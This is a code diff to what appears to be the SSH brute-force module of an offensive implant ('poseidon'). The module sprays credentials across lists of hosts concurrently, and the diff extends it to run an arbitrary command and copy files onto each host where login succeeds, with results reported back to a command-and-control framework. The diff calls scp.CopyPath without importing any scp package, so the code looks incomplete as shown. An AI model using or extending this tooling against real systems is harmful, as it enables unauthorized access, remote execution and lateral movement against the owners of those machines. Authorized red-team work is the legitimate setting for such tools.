@@ -5,11 +5,11 @@ import (
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
-	"log"
 	"sync"
 	"time"
 
 	"github.com/xorrior/poseidon/pkg/commands/portscan"
+	"github.com/xorrior/poseidon/pkg/profiles"
 	"github.com/xorrior/poseidon/pkg/utils/structs"
 	"golang.org/x/crypto/ssh"
 	"golang.org/x/sync/semaphore"
@@ -17,6 +17,7 @@ import (
 
 var (
 	sshResultChan = make(chan SSHResult)
+	mu            sync.Mutex
 )
 
 // SSHAuthenticator Governs the lock of ssh authentication attempts
@@ -33,19 +34,24 @@ type Credential struct {
 }
 
 type SSHTestParams struct {
-	Hosts      []string `json:"hosts"`
-	Port       int      `json:"port"`
-	Username   string   `json:"username"`
-	Password   string   `json:"password"`
-	PrivateKey string   `json:"private_key"`
+	Hosts       []string `json:"hosts"`
+	Port        int      `json:"port"`
+	Username    string   `json:"username"`
+	Password    string   `json:"password"`
+	PrivateKey  string   `json:"private_key"`
+	Command     string   `json:"command"`
+	Source      string   `json:"source"`
+	Destination string   `json:"destination"`
 }
 
 type SSHResult struct {
-	Status   string `json:"status"`
-	Success  bool   `json:"success"`
-	Username string `json:"username"`
-	Secret   string `json:"secret"`
-	Host     string `json:"host"`
+	Status     string `json:"status"`
+	Success    bool   `json:"success"`
+	Username   string `json:"username"`
+	Secret     string `json:"secret"`
+	Output     string `json:"output"`
+	Host       string `json:"host"`
+	CopyStatus string `json:"copy_status"`
 }
 
 // SSH Functions
@@ -62,7 +68,7 @@ func PublicKeyFile(file string) ssh.AuthMethod {
 	return ssh.PublicKeys(key)
 }
 
-func SSHLogin(host string, port int, cred Credential, debug bool) {
+func SSHLogin(host string, port int, cred Credential, debug bool, command string, source string, destination string) {
 	var sshConfig *ssh.ClientConfig
 	if cred.PrivateKey == "" {
 		sshConfig = &ssh.ClientConfig{
@@ -103,47 +109,77 @@ func SSHLogin(host string, port int, cred Credential, debug bool) {
 		return
 	}
 	session, err := connection.NewSession()
+	defer session.Close()
 	if err != nil {
 		res.Success = false
 		res.Status = err.Error()
 		sshResultChan <- res
 		return
 	}
-	session.Close()
+	if source != "" && destination != "" {
+		err = scp.CopyPath(source, destination, session)
+		if err != nil {
+			res.CopyStatus = "Failed to copy: " + err.Error()
+		} else {
+			res.CopyStatus = "Successfully copied"
+		}
+	}
+	if command != "" {
+		modes := ssh.TerminalModes{
+			ssh.ECHO:          0, //disable echoing
+			ssh.TTY_OP_ISPEED: 14400,
+			ssh.TTY_OP_OSPEED: 14400,
+		}
+		err = session.RequestPty("xterm", 80, 40, modes)
+		if err != nil {
+			res.Success = false
+			res.Status = err.Error()
+			res.Output = "Failed to request PTY"
+			sshResultChan <- res
+			return
+		}
+		output, err := session.Output(command)
+		if err != nil {
 
+		}
+		res.Output = string(output)
+	} else {
+		res.Output = ""
+	}
+	//session.Close()
 	res.Success = true
 	sshResultChan <- res
 }
 
-func (auth *SSHAuthenticator) Brute(port int, creds []Credential, debug bool) {
+func (auth *SSHAuthenticator) Brute(port int, creds []Credential, debug bool, command string, source string, destination string) {
 	wg := sync.WaitGroup{}
 
 	for i := 0; i < len(creds); i++ {
 		auth.lock.Acquire(context.TODO(), 1)
 		wg.Add(1)
-		go func(port int, cred Credential, debug bool) {
+		go func(port int, cred Credential, debug bool, command string, source string, destination string) {
 			defer auth.lock.Release(1)
 			defer wg.Done()
-			SSHLogin(auth.host, port, cred, debug)
-		}(port, creds[i], debug)
+			SSHLogin(auth.host, port, cred, debug, command, source, destination)
+		}(port, creds[i], debug, command, source, destination)
 	}
 	wg.Wait()
 }
 
-func SSHBruteHost(host string, port int, creds []Credential, debug bool) {
+func SSHBruteHost(host string, port int, creds []Credential, debug bool, command string, source string, destination string) {
 	var lim int64 = 100
 	auth := &SSHAuthenticator{
 		host: host,
 		lock: semaphore.NewWeighted(lim),
 	}
-	auth.Brute(port, creds, debug)
+	auth.Brute(port, creds, debug, command, source, destination)
 }
 
-func SSHBruteForce(hosts []string, port int, creds []Credential, debug bool) []SSHResult {
+func SSHBruteForce(hosts []string, port int, creds []Credential, debug bool, command string, source string, destination string) []SSHResult {
 	for i := 0; i < len(hosts); i++ {
-		go func(host string, port int, creds []Credential, debug bool) {
-			SSHBruteHost(host, port, creds, debug)
-		}(hosts[i], port, creds, debug)
+		go func(host string, port int, creds []Credential, debug bool, command string, source string, destination string) {
+			SSHBruteHost(host, port, creds, debug, command, source, destination)
+		}(hosts[i], port, creds, debug, command, source, destination)
 	}
 	var successfulHosts []SSHResult
 	for i := 0; i < len(hosts); i++ {
@@ -155,39 +191,59 @@ func SSHBruteForce(hosts []string, port int, creds []Credential, debug bool) []S
 	return successfulHosts
 }
 
-func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
-	tMsg := structs.ThreadMsg{}
+func Run(task structs.Task) {
+
 	params := SSHTestParams{}
-	// do whatever here
-	tMsg.TaskItem = task
+	msg := structs.Response{}
+	msg.TaskID = task.TaskID
+
 	// log.Println("Task params:", string(task.Params))
 	err := json.Unmarshal([]byte(task.Params), &params)
 	if err != nil {
-		log.Println("Error unmarshalling params:", err.Error())
-		tMsg.TaskResult = []byte(err.Error())
-		tMsg.Error = true
-		threadChannel <- tMsg
+		msg.UserOutput = err.Error()
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
 	// log.Println("Parsed task params!")
 	if len(params.Hosts) == 0 {
-		tMsg.TaskResult = []byte("Error: No host or list of hosts given.")
-		tMsg.Error = true
-		threadChannel <- tMsg
+		msg.UserOutput = "Missing host(s) parameter."
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
 
 	if params.Password == "" && params.PrivateKey == "" {
-		tMsg.TaskResult = []byte("Error: No password or private key given to attempt authentication with.")
-		tMsg.Error = true
-		threadChannel <- tMsg
+		msg.UserOutput = "Missing password parameter"
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
 
 	if params.Username == "" {
-		tMsg.TaskResult = []byte("Error: No username given to attempt authentication with.")
-		tMsg.Error = true
-		threadChannel <- tMsg
+		msg.UserOutput = "Missing username parameter."
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
 
@@ -215,24 +271,42 @@ func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
 		PrivateKey: params.PrivateKey,
 	}
 	// log.Println("Beginning brute force...")
-	results := SSHBruteForce(totalHosts, params.Port, []Credential{cred}, false)
+	results := SSHBruteForce(totalHosts, params.Port, []Credential{cred}, false, params.Command, params.Source, params.Destination)
 	// log.Println("Finished!")
 	if len(results) > 0 {
 		data, err := json.MarshalIndent(results, "", "    ")
 		// // fmt.Println("Data:", string(data))
 		if err != nil {
-			log.Println("Error was not nil when marshalling!", err.Error())
-			tMsg.TaskResult = []byte(err.Error())
-			tMsg.Error = true
+			msg.UserOutput = err.Error()
+			msg.Completed = true
+			msg.Status = "error"
+
+			resp, _ := json.Marshal(msg)
+			mu.Lock()
+			profiles.TaskResponses = append(profiles.TaskResponses, resp)
+			mu.Unlock()
+			return
 		} else {
 			// fmt.Println("Sending on up the data:\n", string(data))
-			tMsg.TaskResult = data
-			tMsg.Error = false
+			msg.UserOutput = string(data)
+			msg.Completed = true
+
+			resp, _ := json.Marshal(msg)
+			mu.Lock()
+			profiles.TaskResponses = append(profiles.TaskResponses, resp)
+			mu.Unlock()
+			return
 		}
 	} else {
 		// log.Println("No successful auths.")
-		tMsg.TaskResult = []byte("[-] No successful authentication attempts.")
-		tMsg.Error = false
+		msg.UserOutput = "No successful authenication attempts"
+		msg.Completed = true
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
+		return
 	}
-	threadChannel <- tMsg // Pass the thread msg back through the channel here
+
 }
